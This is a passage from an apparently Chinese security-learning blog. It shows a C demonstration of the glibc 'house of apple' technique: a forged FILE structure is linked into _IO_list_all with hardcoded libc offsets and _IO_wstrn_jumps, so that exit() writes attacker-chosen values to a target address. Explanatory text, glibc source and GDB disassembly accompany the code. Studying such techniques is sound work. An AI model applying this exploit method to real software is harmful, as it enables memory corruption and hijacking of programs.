class="line">                 <span class="string">&quot;  signed char _vtable_offset;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_t *_lock;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_USE_OLD_IO_FILE\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们需要使用伪造的_IO_FILE_complete_plus结构体，并将这个伪造结构体的地址写到_IO_list_all。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在调用exit函数后，结构体需要执行_IO_wstrn_overflow函数，这需要vtable填入_IO_wstrn_jumps的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/vswprintf.c, line 33)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wstrn_overflow (FILE *fp, wint_t c)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* When we come to here this means the user supplied buffer is\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     filled.  But since we must return the number of characters which\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     would have been written in total we must provide a buffer for\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     further use.  We can do this by writing on and on in the overflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     buffer in the _IO_wstrnfile structure.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m  if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      _IO_wsetb (fp, snf-&gt;overflow_buf,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t      / sizeof (wchar_t)), 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t      + (sizeof (snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t\t / sizeof (wchar_t)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Since we are not really interested in storing the characters\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     which do not fit in the buffer we simply ignore it.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_wide_data字段的结构体内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libio.h, line 121)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_wide_data\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_end;\t\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_backup_base;\t/* Pointer to first valid character of\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t   backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_last_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt _codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *_wide_vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，在假结构体中，我们可以控制_wide_data指针的值，因此可以实现在任意位置写入任意值。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_wstrnfile结构体的定义部分：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/strfile.h, line 49)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_streambuf\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE _f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct _IO_strfile_\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_streambuf _sbf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_str_fields _s;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_strfile;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;/* frozen: set when the program has requested that the array object not\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   be altered, reallocated, or freed. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define _IO_STR_FROZEN(FP) ((FP)-&gt;_f._flags &amp; _IO_USER_BUF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_strfile f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is used for the characters which do not fit in the buffer\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     provided by the user.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char overflow_buf[64];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_strnfile;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;extern const struct _IO_jump_t _IO_strn_jumps attribute_hidden;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_strfile f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is used for the characters which do not fit in the buffer\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     provided by the user.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t overflow_buf[64];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_wstrnfile;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到写入的地址值也是我们可以控制的。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;需要注意的是，&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;_IO_wstrn_overflow函数在IDA中的符号表中并不存在。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此在调试时最好可以添加glibc的源码辅助进行调试，效果更好。&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;使用dir + 源码目录即可添加源码。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;另外，可以通过https://libc.rip/查询到所有符号的偏移，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;但数据库中尚未保存本测试环境使用的新版本的libc。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过对_IO_wstrn_jumps跳转表的定义可以大致筛选出_IO_wstrn_jumps的几个地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在__libc_IO_vtables段进行查询，可以找到两个候选的地址：0x82F80和0x847C0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;对应3个不同的_IO_jump_t结构体：0x215DC0、0x215E80、0x216180。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;经过gdb调试可知，_IO_wstrn_jumps的地址偏移应为0x215DC0，_IO_wstrn_overflow为0x82F80。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们首先获取libc地址和基地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)<span class="built_in">puts</span> - <span class="number">0x80ED0</span>;  <span class="comment">// puts函数的偏移</span></span><br><span class="line">    FILE* fake_FILE = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;libc基地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n&quot;</span> STR_END, libc_base);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;堆地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\n&quot;</span> STR_END, (<span class="type">size_t</span>)fake_FILE);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面，我们将malloc出来的地址作为假_IO_FILE_complete_plus的地址，并修改_IO_list_all。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;依然需要注意_IO_flush_all_lockp中的判断条件。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xd8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215DC0</span>;</span><br><span class="line">    <span class="type">size_t</span>* IO_list_all = (<span class="type">size_t</span> *) (libc_base + <span class="number">0x21A680</span>);</span><br><span class="line">    *IO_list_all = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们想要修改的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> RED <span class="string">&quot;m%#zx\n&quot;</span> STR_END, (<span class="type">size_t</span>)victim);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是通过GDB查看到的_IO_wstrn_overflow函数的汇编：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;=&gt; 0x7ffff7e02f80 &lt;_IO_wstrn_overflow&gt;:\tendbr64 \n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f84 &lt;_IO_wstrn_overflow+4&gt;:\tpush   r12\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f86 &lt;_IO_wstrn_overflow+6&gt;:\tmov    r12d,esi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f89 &lt;_IO_wstrn_overflow+9&gt;:\t\033[1;31mlea    rsi,[rdi+0xf0]\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f90 &lt;_IO_wstrn_overflow+16&gt;:\tpush   rbx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f91 &lt;_IO_wstrn_overflow+17&gt;:\tmovq   xmm0,rsi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f96 &lt;_IO_wstrn_overflow+22&gt;:\tpunpcklqdq xmm0,xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f9a &lt;_IO_wstrn_overflow+26&gt;:\tsub    rsp,0x28\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f9e &lt;_IO_wstrn_overflow+30&gt;:\t\033[1;31mmov    rdx,QWORD PTR [rdi+0xa0]\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fa5 &lt;_IO_wstrn_overflow+37&gt;:\t\033[1;31mcmp    QWORD PTR [rdx+0x30],rsi\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fa9 &lt;_IO_wstrn_overflow+41&gt;:\tje     0x7ffff7e02fec &lt;_IO_wstrn_overflow+108&gt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fab &lt;_IO_wstrn_overflow+43&gt;:\tmovq   xmm1,rsi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb0 &lt;_IO_wstrn_overflow+48&gt;:\tmov    rbx,rdi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb3 &lt;_IO_wstrn_overflow+51&gt;:\txor    ecx,ecx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb5 &lt;_IO_wstrn_overflow+53&gt;:\tmovaps XMMWORD PTR [rsp+0x10],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fba &lt;_IO_wstrn_overflow+58&gt;:\tlea    rdx,[rdi+0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fc1 &lt;_IO_wstrn_overflow+65&gt;:\tmovq   xmm2,rdx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fc6 &lt;_IO_wstrn_overflow+70&gt;:\tpunpcklqdq xmm1,xmm2\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fca &lt;_IO_wstrn_overflow+74&gt;:\tmovaps XMMWORD PTR [rsp],xmm1\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fce &lt;_IO_wstrn_overflow+78&gt;:\tcall   0x7ffff7e03610 &lt;__GI__IO_wsetb&gt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fd3 &lt;_IO_wstrn_overflow+83&gt;:\tmovdqa xmm1,XMMWORD PTR [rsp]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fd8 &lt;_IO_wstrn_overflow+88&gt;:\tmov    rdx,QWORD PTR [rbx+0xa0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fdf &lt;_IO_wstrn_overflow+95&gt;:\tmovdqa xmm0,XMMWORD PTR [rsp+0x10]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fe5 &lt;_IO_wstrn_overflow+101&gt;:\tmovups XMMWORD PTR [rdx],xmm1\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fe8 &lt;_IO_wstrn_overflow+104&gt;:\tmovups XMMWORD PTR [rdx+0x10],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fec &lt;_IO_wstrn_overflow+108&gt;:\tmovups XMMWORD PTR [rdx+0x20],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff0 &lt;_IO_wstrn_overflow+112&gt;:\tadd    rsp,0x28\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff4 &lt;_IO_wstrn_overflow+116&gt;:\tmov    eax,r12d\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff7 &lt;_IO_wstrn_overflow+119&gt;:\tpop    rbx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff8 &lt;_IO_wstrn_overflow+120&gt;:\tpop    r12\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ffa &lt;_IO_wstrn_overflow+122&gt;:\tret\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;上面的红色部分就是函数中的if语句比较部分，可见overflow_buf在结构体中的偏移量为0xF0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;另外看一下_IO_wsetb函数：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 91)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    free (f-&gt;_wide_data-&gt;_IO_buf_base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  f-&gt;_wide_data-&gt;_IO_buf_base = b;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  f-&gt;_wide_data-&gt;_IO_buf_end = eb;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (a)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;显然这里如果我们要伪造_wide_data，就必须绕过第一个if语句。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;如果要写入的地址一开始的_IO_buf_base处就是0，那么这个语句可以直接跳过。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但更多时候这里的值可能不是确定的，因此需要第二个判断条件。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;_IO_FLAGS2_USER_WBUF的值为8，即让f-&gt;_flags2 &amp; 8 != 0即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_flags2 = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们将这里修改为目标地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) (<span class="type">char</span> *) victim;</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;修改前：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;为了能够在exit函数调用后看到修改后的目标地址内容，需要另外一个假FILE结构体。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;实际上在house of apple之后，也多使用另一个FILE结构体进行其他的操作。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;将第二个假FILE结构体地址填到第一个FILE的_chain字段，使两者链接。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;第二个结构体使用另外一个_IO_jumps_t指针。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    FILE* fake_FILE_2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    fake_FILE-&gt;_chain = fake_FILE_2;</span><br><span class="line"></span><br><span class="line">    mprotect((<span class="type">void</span>*)(libc_base + <span class="number">0x215000</span>), <span class="number">0x4000</span>, PROT_READ | PROT_WRITE);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;本程序为了方便起见，选择直接修改vtable段为可写，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;并修改第二个FILE使用的_IO_jumps_t中的overflow指针。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span>* other_IO_jumps = (<span class="type">size_t</span>*)(libc_base + <span class="number">0x215E80</span>);</span><br><span class="line">    other_IO_jumps[<span class="number">3</span>] = (<span class="type">size_t</span>)print_victim;</span><br><span class="line"></span><br><span class="line">    fake_FILE_2-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE_2-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE_2-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE_2)[<span class="number">0xd8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215E80</span>;</span><br><span class="line">    fake_FILE_2-&gt;_flags2 = <span class="number">0x8</span>;</span><br><span class="line">    fake_FILE_2-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) (<span class="type">char</span> *) victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
